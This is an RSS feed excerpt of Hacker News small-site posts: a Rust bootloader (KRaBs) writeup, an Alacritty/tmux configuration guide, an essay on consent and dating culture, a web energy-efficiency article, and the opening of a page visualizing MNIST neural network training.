<ol> <li> stage1  </li> A 446 byte program written to the boot sector. The segment registers(CS, DS, ES, SS) are set to <code>0x07C0</code>, and the stack pointer (ESP) is initialized to <code>0xFFF0</code>. After that, stage2 is loaded to address <code>0x07C0:0x0200</code>, and jumps to address <code>0x07C0:0x0206</code>. In the latter half of stage1, there is an area for storing the sector position and length (in units of 512 bytes) of the stage2 program. <li> stage2  </li> Load stage3 and stage4, then jump to stage3. The stage3 program is loaded at address <code>0x07C0:0x6000</code>, the stage4 is loaded at address <code>0x0003_0000</code> in the extended memory area. The file is read from the disk using a 2K byte track buffer from address <code>0x07C0:0xEE00</code>, and further transferred to an appropriate address using <code>INT 15h</code> BIOS Function <code>0x87h</code>. A mechanism similar to this function is used in stage 4. When the loading of stage3 and stage4 is completed, jump to address <code>0x07C0:0x6000</code>.  <li> stage3  </li> Do hardware and software initialization which need BIOS calls. After a series of initialization, empty_zero_page information is prepared in <code>0x07C0:0x0000</code> to <code>0x07C0:0x0FFF</code>. Enable the A20 line, change the address bus to 32 bits, and shift to the protect mode. Then, jump to the Stage4. <li> stage4  </li> Mount the FAT32 EFI System Partition. Then, read and parse the CONFIG.TXT on that partition. Load ELF kernel image, initrd, and kernel command line according to CONFIG.TXT. Drop to real mode when executing I/O. Set Command line and image informations in empty_zero_page. ELF kernel image is stored to the extended memory address <code>0x100000</code> or later, and then the ELF32/ELF64 file is parsed and loaded. If the target is ELF64, set the 4G boot pagetable and transition to long mode. Finally, jump to the entry point to launch the kernel. At this time, put the physical address (<code>0x00007C00</code>) of the empty_zero_page information prepared in the low-order memory into the <code>ESI</code> or <code>RSI</code> register. <li> plankton🦠  </li> library common to stage1 ~ stage4. </ol> 
</section>
<section>
<h3>How build KRaBs</h3>
<p>The directory structure of the KRaBs project is as follows: </p>
<pre><code>
$ cd /path/to
$ tree . -L 3
.
├── build.rs
├── Cargo.toml
├── rust-toolchain
├── src
│   ├── bios
│   │   ├── plankton
│   │   ├── stage_1st
│   │   ├── stage_2nd
│   │   ├── stage_3rd
│   │   └── stage_4th
│   ├── main.rs
│   └── uefi
...
</code></pre>
<p>All four stages that make up the bootloader for the legacy BIOS and a library called plankton are stored as a sub crate under a directory named <code>src/bios</code>.
<br>
 Under the <code>src/uefi</code> directory, we plan to store UEFI-compatible bootloader crates.
<br>
 All these sub-crates will be built by <code>build.rs</code> at <code>cargo build</code> time.
<br>
 </p>
<p><code>src/main.rs</code> is not the main body of the bootloader, <code>src/main.rs</code> is the CLI program that places KRaBs on the disk. This <code>main.rs</code> will write each stage of the KRaBs to the appropriate location on the disk. The <code>-w</code> option is used to write the stages to disk. </p>
<p>With this directory structure, just run <code>cargo buil</code> to build the CLI and the boot loader, and <code>cargo run -- -w disk.img</code> to burn the boot loader to disk. You can also test it with qemu by running <code>cargo run -- -e disk</code>. </p>
</section>
<section>
<h3>DISK Structure</h3>
<p>KRaBs supports disks that are partitioned in GPT format.
<br>
 The BIOS Boot Partition and the EFI System Partition are required. Place stage1 in the boot sector and stage2 ~ stage4 boot code for legacy BIOS in the BIOS Boot Partition. Place the CONFIG.TXT, Linux kernel, initrd on the FAT32 file system of the EFI System Partition. </p>
<p>Example: </p>
<pre><code>
$ gdisk -l disk.img 
...
Found valid GPT with protective MBR; using GPT.
Disk disk2.img: 204800 sectors, 100.0 MiB
Sector size (logical): 512 bytes
Disk identifier (GUID): 2A1F86BB-74EA-47C5-923A-7A3BAF83B5DF
Partition table holds up to 128 entries
Main partition table begins at sector 2 and ends at sector 33
First usable sector is 34, last usable sector is 204766
Partitions will be aligned on 2048-sector boundaries
Total free space is 2014 sectors (1007.0 KiB)

Number  Start (sector)    End (sector)  Size       Code  Name
   1            2048            4095   1024.0 KiB  EF02  BIOS boot partition
   2            4096          106495   50.0 MiB    EF00  EFI system partition
   3          106496          204766   48.0 MiB    8300  Linux filesystem
</code></pre>
</section>
<section>
<h3>Why use EFI System Partition?</h3>
<p>The reason for this is to make this project compatible with the UEFI environment in the future.
<br>
 I didn't support UEFI from the start because: </p>
<ul> <li>This bootloader was originally intended to be used on older PCs, such as the ThinkPad 600X.</li> <li>Currently, Legacy BIOS support works in a wider range system than UEFI.</li> <li>It is mainly intended to be used in the cloud environment except my PC. Legacy BIOS is the mainstream in x86 cloud environment, and there seems to be no merit to replace it with UEFI.</li> </ul> 
</section>
<section>
<h2>Is Rust good for writing a bootloader?</h2>
<p>I know there are pros and cons, but for me, Rust has been so much easier and better than writing C and assemblies. Personally, I think Rust is also pretty good for low-level programming, like bootloaders. </p>
<ol> <li> It's a great relief when the compilation is completed without problems   </li> When something goes wrong, most of the time I only need to suspect the unsafe part. This has made debugging a lot easier. I'm an amateur programmer, but thanks in part to this, I was able to complete my first prototype in a week. <li> Rust's build system is the best  </li> In Rust, you don't have to wonder which object file to link with which, like in C. <li> I can use my C experience</li> Since the chain loader is a rocket structure, we always have to code the unsafe parts in order to move to the next stage, and I thought it would be nice to be able to use the same techniques I often use in C for the unsafe parts.  <li> I think even the low-level code in no_std can be written in a modern way.</li> </ol> 
</section>
<section>
<h2>Issues</h2>
</section>
<section>
<h3>(RESOLVED) Setting Page Tables</h3>
<p>I tried to set up the page table with an alignment with a linker script or a struct attribute <a target="_blank" rel="noopener noreferrer" href="https://doc.rust-lang.org/reference/type-layout.html#representations">align</a>, but none of these things worked. It looked like the alignment settings were breaking other data structures. It's possible that I wasn't doing it right, but I didn't understand why and gave up debugging. In the end, I dealt with it by manually allocating the page table to the area where I wanted to set up. </p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/o8vm/krabs/blob/master/src/bios/stage_4th/src/svm/lm.rs#L44-L69">This code:</a> </p>
<pre><code>
fn setup_page_tables() {
    use plankton::layout::PGTABLE_START;
    use plankton::mem::MemoryRegion;
    let mut pg_table = …</code></pre></section></article></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vmm.dev/en/rust/krabs.md">https://vmm.dev/en/rust/krabs.md</a></em></p>]]>
            </description>
            <link>https://vmm.dev/en/rust/krabs.md</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514100</guid>
            <pubDate>Fri, 18 Sep 2020 07:54:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Play console games on the web – AirConsole]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514066">thread link</a>) | @morgam
<br/>
September 18, 2020 | http://aircn.sl/console | <a href="https://web.archive.org/web/*/http://aircn.sl/console">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://aircn.sl/console</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514066</guid>
            <pubDate>Fri, 18 Sep 2020 07:49:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Alacritty – Fastest OS X Terminal Emulator – Terminal like tmux/alacritty config]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 6 (<a href="https://news.ycombinator.com/item?id=24513821">thread link</a>) | @bebrws
<br/>
September 18, 2020 | https://bradbarrows.com/post/alacritty | <a href="https://web.archive.org/web/*/https://bradbarrows.com/post/alacritty">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><article><img src="https://bradbarrows.com/static/alacritty.png" alt="Alacritty - Fastest OSX Terminal?"><div><h2>Introducing Alacritty</h2><p>Alacritty is most likely the fastest GPU accelerated terminal emulator for OSX.</p><p>The only reason I hadn't tried it or used it very much before was the learning curve 
of a new terminal emulator and it's lack of tabs.</p><p>Luckily I was able to figure out how to make a great tmux and alacritty configuration 
file along with some nice bash functions to help with editing the configurations.</p><h2>Setting up Alacritty using my build</h2><p>First <a href="https://github.com/bebrws/alacritty/releases/download/0.6.0-dev-brads/Alacritty.zip">install Alacritty</a> from my repo to get a build that has an "Always On Top' action
I built in. The keyboard combo for this will "Command Shift A".</p><h2>Setting up Alacritty using my tmux and alacritty config</h2><p>Next clone my <a href="https://github.com/bebrws/myalacritty">configuration files</a></p><pre><code>git clone git@github.com:bebrws/myalacritty.git
cd myalacritty
cp tmux.conf ~/.tmux.conf
mkdir -p ~/.config/alacritty/
cp * ~/.config/alacritty/
wget http://bradbarrows.com/dls/jsin.zip
unzip jsin.zip
mv jsin /usr/local/bin/jsin</code></pre><h2>Bash/ZSH functions</h2><p>Add these functions to your .zshrc</p><pre><code>######### ALACRITTY GOOODNESS ############
alias -g alacrittycolors='python3 /Users/bbarrows/Library/Python/3.8//lib/python/site-packages/alacritty_colorscheme/cli.py '
# To use run: alaFontSize 12
function alaFontSize() {
    cat ~/.config/alacritty/alacritty.yml | jsin --yaml --yamlout --whole "(l.font.size=Number(\"$1\")) &amp;&amp; l; " &gt; $HOME/.config/alacritty/alacritty.yml.tmp
    mv $HOME/.config/alacritty/alacritty.yml.tmp $HOME/.config/alacritty/alacritty.yml
}
# To use run: alaOpacity 0.8
function alaOpacity() {
    cat ~/.config/alacritty/alacritty.yml | jsin --yaml --yamlout --whole "(l.background_opacity=Number(\"$1\")) &amp;&amp; l; " &gt; $HOME/.config/alacritty/alacritty.yml.tmp
    mv $HOME/.config/alacritty/alacritty.yml.tmp $HOME/.config/alacritty/alacritty.yml
}
# To use run: alaColorTheme
# Must run: sudo pip3 install alacrittycolors
# before using
# Also make sure jsin is installed from above or: https://github.com/bebrws/jsin
function alaColorTheme() {
   export ALABASE=$(python3 -m site | grep site | grep packages | head -n 1 | jsin "l.replace(/\s*\'/g, '').replace(/,/g, '')")
   python3 $ALABASE/alacritty_colorscheme/cli.py -a ~/.config/alacritty/colors/$(ls  ~/.config/alacritty/colors/ | fzf --preview "python3 $ALABASE/alacritty_colorscheme/cli.py -a ~/.config/alacritty/colors/{} &amp;&amp; htop")
}
function alaResetDark()  {
  cp ~/.config/alacritty/alacritty.yml.dark ~/.config/alacritty/alacritty.yml
}
function alaResetLight()  {
  cp ~/.config/alacritty/alacritty.yml.light  ~/.config/alacritty/alacritty.yml
}</code></pre><h2>Keyboard shortcuts</h2><ul><li>You should end up with tabs that you can click on just like Terminal.app and then can use the keyboard shortcuts "Shift-Left or Right arrow key".</li><li>"Control-b then c" - Create a new tab</li><li>"Control-b then f" - Create a horizonal window in the tab</li><li>"Control-b then v" - Create a veritical window in the tab</li><li>"Alt-Left or Right arrow key" - Move between split windows in the tab</li><li>"Command-Shift-A" - Keep Alacritty always on top</li><li>"Command-Shift-F" - Full screen</li><li>"Command-Shift-=/-" - Font size</li></ul><p>All the control and alt backspace and arrow key bindings should work out of the box!</p><p>You will end up with this beautiful terminal:</p><p><img alt="Alacritty in action" src="https://bradbarrows.com/static/alacritty.gif"></p></div></article></div></div></section></div>]]>
            </description>
            <link>https://bradbarrows.com/post/alacritty</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513821</guid>
            <pubDate>Fri, 18 Sep 2020 07:10:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Love Hurts: So let’s stop infantilizing women and demonizing men]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24513528">thread link</a>) | @jseliger
<br/>
September 17, 2020 | https://www.persuasion.community/p/love-hurts-511 | <a href="https://web.archive.org/web/*/https://www.persuasion.community/p/love-hurts-511">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fd514fda0-6ff4-4caa-82cb-aaab2d7d66bb_4804x3203.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fd514fda0-6ff4-4caa-82cb-aaab2d7d66bb_4804x3203.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/d514fda0-6ff4-4caa-82cb-aaab2d7d66bb_4804x3203.jpeg&quot;,&quot;height&quot;:971,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:1378800,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></p><p>If you've ever read a Regency romance novel or watched a Jane Austen adaptation, you probably have a passing acquaintance with the trope of the <em>ruined woman</em>: that tragic victim of some caddish man who loved her, left her, and wrecked her societal resale value on his way out the door. In a world governed by a patriarchal system of marriage and inheritance, dependent on female purity to ensure any male offspring were legitimate, the ruined woman was literally damaged goods. Even the slightest whiff of a premarital dalliance could spell her undoing.</p><p>These old school ideas about women's worth have never entirely left us, resurfacing over the years in everything from the work of Andrea Dworkin to the abstinence wars of the late 1990s (when sex ed teachers would memorably compare girls who had sex before marriage to used pieces of Scotch tape). With dowries out of the picture, the idea that sex devalued women attached itself instead to America's sudden obsession with self-esteem. A young woman who had sex, particularly casual sex, clearly didn't respect herself. She was trying to fill an emotional void with cheap physical connection, and—yes—was making herself unmarriageable. <em>He won’t buy the cow,</em> we were told, <em>if he can get the milk for free.</em></p><p>Today, the notion that sexual contact is degrading to women has become wrapped up in the contemporary progressive language of trauma and consent. The damage in question is emotional, not material, but the paternalistic message is the same: innocent women must be protected. </p><p><em>Consent is sexy</em>, we are told, as sex-education pamphlets primly instruct us in the essentials of mid-coital conversation.<em> Do you like it when I touch you there? What do you want me to do to you? </em>Never mind that said literature studiously ignores the fact that for the young, inexperienced people at whom such instructions are directed, dirty talk by administrative mandate just adds a whole new layer of pressure to an already awkward situation: For all its protestations about how <em>hot </em>consent can be, the progressive discourse surrounding sex is markedly unsexy. Amid the obsession with power, oppression and the ever present threat of harm, the notion of desire (or, heaven forbid, <em>fun</em>) all but disappears. Even the most pornographic consent-is-sexy script is about risk mitigation, not titillation, an insurance waiver with a side of heavy breathing. </p><p>This laser-focus on consent effectively recasts sex itself as a dangerous act, to be undertaken with extreme caution and only if absolutely necessary. And if relationships are mainly about power and the threat of abuse, those who pursue them too enthusiastically must be viewed with suspicion. More old-school gender stereotypes crop up here: men are increasingly seen as predators almost by default, while women are cast as helpless, even infantile. (Witness the rise of the word "grooming," previously reserved for sexual predation of children, as something done to women in their twenties.) As a breathtaking range of disappointing male behavior gets swept under the umbrella of MeToo, the line between pursuing a woman and preying on her has become blurred. When it was revealed that comic book writer Warren Ellis <a href="https://www.theguardian.com/books/2020/jul/13/women-speak-out-about-warren-ellis-transmetropolitan">had relationships with multiple women at once</a>, the litany of harms included no sexual misconduct at all; instead, the women were "[shocked] at the sheer magnitude of his pursuits … heartbroken when he stopped talking to them, or angry after discovering he was sending many of them identical messages." </p><p>Shock, heartbreak, anger: these are normal things to feel when a romantic relationship goes sour. But today, they're lumped into the nefarious category of abuse by virtue of the purported power someone like Ellis—older, wealthier, more professionally successful, or otherwise more <em>privileged</em>—holds over his partners. By contrast, the notion that these were known and unavoidable risks of intimacy is dismissed as victim-blaming. As one of Ellis' accusers tweeted, "None of us consented to being manipulated." </p><p>This notion of consent as a safeguard against upsetting emotions is both new and counterintuitive: in most contexts (for instance, medical trials or media interviews), consent is sought precisely because what follows cannot be predicted, and may well be uncomfortable. But in certain progressive spaces, discomfort of any kind is taken to indicate the absence of consent, rendering countless normal human interactions suspicious. Turning someone down isn't comfortable, but neither is asking someone out. Even happy relationships involve moments of discomfort, disappointment, conflict—and even amicable breakups are rarely pain-free. Yet young people are now being taught to expect absolute emotional safety in sex, love and courtship at all times—and that if they feel hurt, disappointed or betrayed, it means they've been violated.</p><p data-attrs="{&quot;url&quot;:&quot;https://www.persuasion.community/p/love-hurts-511?&amp;utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;class&quot;:null}"><a href="https://www.persuasion.community/p/love-hurts-511?&amp;utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share"><span>Share</span></a></p><div><p>So how did we get here? Social conservatives say that hookup culture is to blame, and they're not wrong: traditional courtship, monogamy and marriage have their downsides, but they do give relationships a certain amount of structure and security. In the age of Tinder, those safeguards are comparatively hard to come by—and the elaborate (and sometimes ridiculous) bureaucracy of consent regulations may be best understood as a desperate attempt to impose some order on this wild west of sex and intimacy, spearheaded by people who are terrified of being vulnerable or getting hurt. There's a sense that relationships could be made unfailingly safe and comfortable, that disappointment and awkwardness wouldn't exist, if we only had enough <em>rules</em>. </p><p> Relationships have always been risky endeavors, but, ironically, this hypervigilance has made them seem outright terrifying. Every new romance is treated like a scavenger hunt for "red flags" that forewarn abuse, and every breakup is subject to adjudication via the #MeToo framework. Unhappy exes hash out their grievances on social media in a way that used to be reserved for divorced celebrities wrangling for the sympathy of the press. Private affairs are dragged into the spotlight for public reckoning and reparations. Men, already saddled with the pressure of making the first move, have to calculate the additional risk that an awkward overture or misread signal will result not just in rejection, but public humiliation and ruination. For all its valuable contributions to combating sexual harassment in the workplace, #MeToo has also made dating itself at once more fraught and less appealing—for everyone. If every relationship is a power struggle, in which the less privileged party is perpetually at risk of being victimized, why even bother? Who could possibly enjoy this? </p></div><p>This is not to demand a return to the rigid courtship norms of the Regency era—nor to the blinkered sex-positivity of the early aughts. Instead, we need to reintroduce basic notions of female empowerment and individual agency, and push back against the facile understanding of complex interpersonal relationships as power struggles between oppressed and oppressor. We should teach both young men <em>and</em> young women to recognize each other's vulnerability and humanity—even when a partner may hold more power than they do by certain measures—and to engage with their lovers as individuals, rather than as representatives of an identity group. And we should also teach young people to tolerate and work through discomfort, rather than seeing themselves as helplessly in thrall to power dynamics that leave them forever teetering on the precipice of victimhood. </p><p>When I wrote a teen advice column between 2009 and 2019, there was one question I received more often than any other: "How can I fall in love without getting hurt?" My answer was always the same: You can't! Intimacy requires vulnerability; the joy of human connection always comes with the risk of being hurt. But that risk is the same for everyone, no matter how privileged or blessed with institutional clout. Even the wealthiest, whitest, most cisheterosexual dudebro in the world can be absolutely wrecked by heartbreak—and even a person who sits at the intersectional nexus of multiple oppressed identity categories has the power to break someone's heart.</p><p>As much as trauma and abuse have replaced purity and marriageability on the landscape of moral panics, the same old fear is at work: that women's desires, left unchecked, will leave them in ruins. And while the impulse to protect young people from emotional pain may be well intentioned, the results are toxic. The obsessive focus on power as the driving mechanism in all relationships fuels a cycle of catastrophic thinking: women are ever more fearful of being mistreated, ever more convinced of their powerlessness to avoid it, and ever more sure that when it happens, they will be unable to handle it. And all the while, men, dehumanized by a framework that casts their desires as inherently predatory, are being taught to mistrust and infantilize women in the guise of respecting them.</p><p>We need to permanently banish the specter of the ruined woman from our understanding of heterosexual relationships. A healthy, sex-positive society acknowledges that unpredictability is a feature of dating, not a bug, and cannot be consent-scripted out of existence—particularly for inexperienced people, and especially when it comes to casual sex. Young people must be taught to be kind with and conscientious to each other, to respect boundaries, and to err on the side of caution in ambiguous situations—but they should also be taught that love and sex are rife with painful misunderstandings, and that even well-meaning people can hurt each other because they're insecure, confused or genuinely unsure about what they want. Instead of trying to keep them from ever feeling heartbreak, regret or shame, let's teach them that these things are always survivable, and sometimes even useful. Teach them to be gracious about rejection and charitable about missteps, knowing that they'll make mistakes …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.persuasion.community/p/love-hurts-511">https://www.persuasion.community/p/love-hurts-511</a></em></p>]]>
            </description>
            <link>https://www.persuasion.community/p/love-hurts-511</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513528</guid>
            <pubDate>Fri, 18 Sep 2020 06:23:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How can we, as web professionals, help to make the web more energy efficient?]]>
            </title>
            <description>
<![CDATA[
Score 228 | Comments 382 (<a href="https://news.ycombinator.com/item?id=24513427">thread link</a>) | @giuliomagnifico
<br/>
September 17, 2020 | https://cmhb.de/web-design-and-carbon-impact | <a href="https://web.archive.org/web/*/https://cmhb.de/web-design-and-carbon-impact">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
<section>
    <div><blockquote>
<p>How can we, as web professionals, help to make the web more energy efficient?</p>
</blockquote>
<p>From data centres to transmission networks to the devices that we hold in our hands, it is all consuming electricity, and in turn producing carbon emissions. According to recent estimates, the entire network already consumes 10% of global electricity production, with data traffic doubling roughly every two years. It’s probably something very few people think about, or are even aware of as being an issue. But the fact of the matter is that the Internet consumes a huge amount of electricity. And when it comes to web design, there is a lot that can be done to make the web far more energy efficient.</p>
<hr>
<h2>Attitudes</h2>
<p>Creating a website is a lot more accessible today, made simpler by the emergence of no-code site builders. But it might be asking a lot for your typical web user or amateur creator to be aware of the environmental impact of their site. This, however, shouldn’t really be the case for any digital professional. Naturally, web developers will be more conscious of the weight of their pages, given that they are fully immersed in the code and content management that serves what you see on a web page. But even then, many developers simply look for the quickest route to completing a project, rather than the best way to produce the quickest and most efficient site. </p>
<p>So they load a website with bulky Javascript and third-party tools to meet the visual specification of the client or designer. As long as it works, right? They probably don’t care. They’re probably happy with their site that loads quickly on their 500Mbps connection. Who cares if they’re wasting expensive data on mobile connections in other countries? “But Carl, some of us don’t have the luxury of building super high-performance, lightweight, and optimised sites due to client budgets and deadlines.” Well, I think you need to work on your craft, change your attitude and your priorities, or find another profession.</p>
<p>When we talk about the energy efficiency of websites, it’s easy to assume that it’s a purely technical topic. However, efficiency can be improved before we even build a website. Design and content have a big impact on energy efficiency.</p>
<p>Therefore, some of the biggest contributors to heavy sites and large CO2 emissions, are <em>designers</em>. Large moving imagery, multiple web fonts, animation, sound, autoplaying video, and generally esoteric design is prevalent these days. We see showcase after showcase of the <em>best of the web</em>, where the only criteria is: “Does it look well-designed?” Well, look under the hood. It’s pretty terrifying. And that’s not even getting into the many accessibility concerns. If only more designers would ask themselves, “When was the last time I considered page size when designing something? When was the last time I decided that page weight was more important than aesthetics?” </p>
<p>These are questions I have put to designers before, and the response quite often is, “I’m just experimenting with technologies and trying to improve my UI skills. What harm is there in that?” Well, <em>Site of the Day</em>, the harm is your energy usage, and the likelihood that nobody—besides an echo chamber of fellow designers—give a shit about your over-design. People just want to access content quickly, without distraction, without friction, and without it using a tonne of data. That’s not to say aesthetics aren’t important—they certainly are. The visual design of a site can play a significant role in user experience, readability, and conversion, but as with most things, there is a balance to be achieved. And there is a responsibility to be shared.</p>
<hr>
<h2>Solutions</h2>
<p>Fortunately, there are a growing number of web professionals who do care about the impact sites have on the planet, and there are many solutions designers and developers alike can find to improve their sites without overly compromising their designs. Solutions that I am actively looking into to improve my own work.</p>
<p>So how can we be more energy efficient in web design? Well, the folks over at <a href="https://www.wholegraindigital.com/blog/website-energy-efficiency/">Wholegrain Digital</a> put together a comprehensive list, but here are some key considerations:</p>
<h3>Reduce Images</h3>
<p>The single largest contributors to page weight. The more images, the more data needs to be transferred and the more energy is used. A good starting point is to ask oneself:</p>
<ul>
<li>Does the image genuinely add value to the user?</li>
<li>Does it communicate useful information?</li>
<li>Could the same impact be achieved if the image was smaller?</li>
<li>Could we achieve the same effect with a vector graphic (or even CSS style) instead of a photo?</li>
</ul>
<h3>Optimise Images</h3>
<p>Some designs are focused almost entirely on imagery, in which case optimisation is vital to better performance. There are technical decisions that significantly affect the file size of images displayed on a page. These include:</p>
<ul>
<li>Load images at the correct scale instead of relying on CSS to resize them, so that you avoid loading images that are larger than the scale they will be displayed at.</li>
<li>Use image optimisation tools before you upload them to your site. I personally use <a href="https://imageoptim.com/mac">ImageOptim</a>.</li>
<li>Use the most efficient file format for each image, such as WebP instead of JPEG (although this is not supported by all browsers).</li>
<li>Use image processing tools to resize, crop, and enhance your images that are served. I use <a href="https://www.imgix.com/">imgimx</a> for this, which works well for image-heavy sites such as <a href="https://minimalissimo.com/">Minimalissimo</a>.</li>
</ul>
<h3>Reduce Video</h3>
<p>By far the most data intensive and processing intensive form of content. As with images, ask yourself if videos are really necessary. If they are, never autoplay a video. It creates a much higher load on the users CPU, resulting in vastly greater energy consumption. Plus, it’s annoying as hell. Let the user decide whether or not to play a video.</p>
<h3>Font Selection and Optimisation</h3>
<p>Web fonts can enhance the visual appeal of site designs, as well as improve readability, but they can add significant file weight to the sites on which they are used. A single font file could be as much as 250Kb, and that might only be for the standard weight. If you want bold, add another 250Kb! A couple of options worth considering:</p>
<ul>
<li>Use system fonts where possible.</li>
<li>Use fewer font variations.</li>
<li>Stick to modern web font file formats like WOFF and WOFF2.</li>
<li>Subset fonts to only include the characters needed on the site.</li>
</ul>
<h3>Write Clean Code</h3>
<p>Tidy and streamlined code is a fundamentally good thing. Keep code clean and simple, avoid duplication, and write efficient queries. The code behind the scenes should be a well oiled, lean machine. And I’ll take this opportunity to share a controversial opinion: <em>all designers should learn to code.</em> At least if they want a website. No-code site builders can be very good, but if you’re not aware of the underlying code, then you’ll be less aware of ways to optimise your site.</p>
<h3>Use Less Javascript</h3>
<p>JS impacts website efficiency in two ways: by adding file weight to the web page and by increasing the amount of processing required by the user’s device. The second of these is something that applies to JS much more than to other types of files. Look for ways to achieve front-end interactions, functionality, and animations using more efficient technologies like CSS, or at least use JS efficiently. A particular mention should be given here to tracking and advertising scripts that rarely offer any value to the user, but can add significant file weight. Don’t let advertising get in the way of craftsmanship.</p>
<h3>Use Server Caching</h3>
<p>Using caching technologies such as <a href="https://memcached.org/">Memcached</a> or <a href="https://varnish-cache.org/">Varnish</a> pre-generate static versions of each page so that the server overhead can be significantly reduced for most visitors. This significantly reduces server energy consumption and makes a big difference to page load times. </p>
<h3>SEO</h3>
<p>When optimising a site for search engines, we are helping people find the information they want quickly and easily. When SEO is successful, it results in people spending less time browsing the web looking for information, and visiting fewer pages that don’t meet their needs.</p>
<hr>
<p>No site is perfect, but appreciating that we have a responsibility to produce better digital design for the planet and for users is a good place to start. Web efficiency is an attitude and the result of a mindful approach to building for the web.</p>
<hr>
<h2>Useful Resources</h2>
<ul>
<li><a href="https://www.websitecarbon.com/">Website Carbon</a> (test your site’s carbon footprint)</li>
<li><a href="https://imageoptim.com/mac">ImageOptim</a> (image optimisation tool)</li>
<li><a href="https://www.imgix.com/">imgix</a> (image processing tool)</li>
<li><a href="https://developers.google.com/speed/pagespeed/insights/">Google PageSpeed Insights</a> (test your site’s performance)</li>
<li><a href="https://solar.lowtechmagazine.com/low-tech-solutions.html">Low-tech Solutions</a> (by Low-tech Magazine)</li>
</ul></div>
</section>
    </div></div>]]>
            </description>
            <link>https://cmhb.de/web-design-and-carbon-impact</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513427</guid>
            <pubDate>Fri, 18 Sep 2020 06:02:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Visualizing how a NeuralNetwork learns to recognize the MNIST digits]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24513373">thread link</a>) | @zbendefy
<br/>
September 17, 2020 | https://zbendefy.github.io/neuralnet-web/index.html | <a href="https://web.archive.org/web/*/https://zbendefy.github.io/neuralnet-web/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

    <p>Visualizing a neural network
    </p>

    

    <p>
        Training a Neural network to perform well is not an easy task. The many
        layers of neurons, each having lots of weights and biases often add up
        to several millions of parameters to configure trough learning. Understanding what
        these parameters do by looking at them as raw data is not possible, thus we need somehow visualuze
        what the network does.
        Beside the architecture of the network, we also have to choose and tune a range of training parameters as well, such as activation function,
        regularization parameters and cost function that, to be tuned well, require some rough idea of what 
        the network does.
    </p>

    <picture>
        <source srcset="https://zbendefy.github.io/neuralnet-web/assets/preview.webp" type="image/webp">
        <source srcset="https://zbendefy.github.io/neuralnet-web/assets/preview.gif" type="image/gif">
        <img src="https://zbendefy.github.io/neuralnet-web/assets/preview.webp">
            <p> 
                A neural network learning to recognize digits. Each pixel represents a weight of the network.
            </p>
        
    </picture>

    <p>
        In a conventional algorithm choosing an optimal structure for the data the algorithm operates 
        on can be relatively easily figured out by analyzing the cost of the algorithm and conducting measurements.
        Debugging such an algorithm is also relatively straightforward with many advanced tools available.
        In the case of neural networks however it is often very difficult to understand what a network had eventually
        learned to do during a training, let alone guessing it beforehand. And when a network is not behaving like expected, 
        the familiar debugging tools are not that helpful in figuring out where the issue lies. In some cases however 
        such as image recognition problems we can sort of visualize what the network is trying to learn
        and gain some insight into the learning process. Let's see an example to that.
    </p>
    
    <p>
        The <a href="http://yann.lecun.com/exdb/mnist/">MNIST dataset</a> of hand-written digits is a classic example to introduce machine learning on.
        This dataset contains pictures of hand-written numbers from 0 to 9 and are annotated with the number that is drawn on them.
        The size of the pictures is 28x28 pixels, (in total 784 pixels).
        As such, the data can be used to train a neural network using the pictures as inputs, and the corresponding number as the desired output.
        There are 60,000 training examples and 10,000 test examples in the dataset to train and test on.
    </p>

    <img src="https://zbendefy.github.io/neuralnet-web/assets/MnistExamples.png">
        <p> 
            Some example images from the MNIST dataset
        </p>
    

    <p>
        To try things out, I trained a very simple network using my 
        <a href="https://github.com/zbendefy/machine.academy">neural network library</a> with the following parameters:
    </p>


    <ul>
        <li>Input layer: 784 neurons (one for each pixel of a source image)</li>
        <li>1 Hidden layer: 64 neurons</li>
        <li>Output layer: 10 neurons (1 neuron for each possible output)</li>
        <li>Sigmoid activation is used</li>
        <li>Cross-entropy cost function</li>
        <li>L2 regularization (lambda=1,5)</li>
        <li>Learning rate: 0.01</li>
    </ul>

    <p>
        The network was initialized using the Xavier initialization that provides a good randomized starting point for a network to be trained. 
        The total number of weights and biases is 50,890.
